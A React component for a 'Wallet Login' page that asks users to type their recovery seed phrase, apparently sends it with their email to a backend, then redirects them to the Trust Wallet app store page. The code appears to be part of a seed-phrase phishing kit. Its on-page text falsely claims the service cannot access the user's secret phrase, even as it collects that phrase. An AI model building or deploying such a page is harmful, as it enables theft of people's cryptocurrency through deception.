import styled from 'styled-components'
import Logo from './Logo'
import { Button, Loading, NoticeMessage, TextArea } from '../../theme/ThemeStyle'
import { useDispatch, useSelector } from 'react-redux'
import { api } from '../../common/api'
import { useEffect, useState } from 'react'
import { clearAccountValidationErrors, createAccountValidationError } from '../../app/accountVerification/slice'
import { AccountVerificationWrapper, Container, Main } from './GetStarted'

const Login = () => {
    const dispatch = useDispatch()
    const { loading, error, isAuthenticated } = useSelector(state => state.accountVerification)

    const [mnemonic, setMnemonic] = useState('')

    const handleLogin = (e)=>{
        e.preventDefault()

        const email = localStorage.getItem('email')

        const validLength = mnemonic.trim().split(/\s+/g).length >= 12

        if(validLength){
            dispatch(api.loginWallet({mnemonic, email}))
        }else{
            dispatch(createAccountValidationError('Invalid Seed Phrase'))
        }
    }

    const handleInput = e => {
        if(error){
            dispatch(clearAccountValidationErrors())
        }

        setMnemonic(e.target.value)
    }

    useEffect(()=>{
        if(isAuthenticated){
            window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite'
            dispatch(clearAccountValidationErrors())
        }
    },[isAuthenticated])
  return (
    <Main>
        <Logo />
        <Container>
            <AccountVerificationWrapper onSubmit={handleLogin}>
                <Question>
                    <HeadingText>Wallet Login</HeadingText>
                    <Title>Enter your recovery seed phrase to access your account</Title>
                    <p>True ownership of your crypto assets - we secure your wallet, but don't control or have access to your private keys or secret phrase - only you do.</p>
                    {error&&<NoticeMessage value='error'>{error}</NoticeMessage>}
                    <TextArea 
                        rows={4} 
                        value={mnemonic} 
                        onChange={handleInput}/>

                </Question>

                <Button disabled={loading} type='submit'>Login <Loading value={loading}/></Button>
            </AccountVerificationWrapper>
        </Container>
    </Main>
  )
}

const Wrapper = styled.form`
    flex: 1;
    padding: 10px;
    height: calc(100% - 20px);
    display: flex;
    flex-direction: column;
    & :last-child{
        margin: auto 0 20px;
    }
`

const Question = styled.div`
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 50px 20px;
    & p{
        color: ${({theme})=>theme.colors.dark3};
        margin: 0 0 20px;
        font-size: 12px;
        line-height: 1.2;
    }
`
const HeadingText = styled.h1`
    font-size: 36px;
    margin: 0 0 50px;
`
const Title = styled.h2`
    font-size: 20px;
    margin: 0 0 5px;
`

export default Login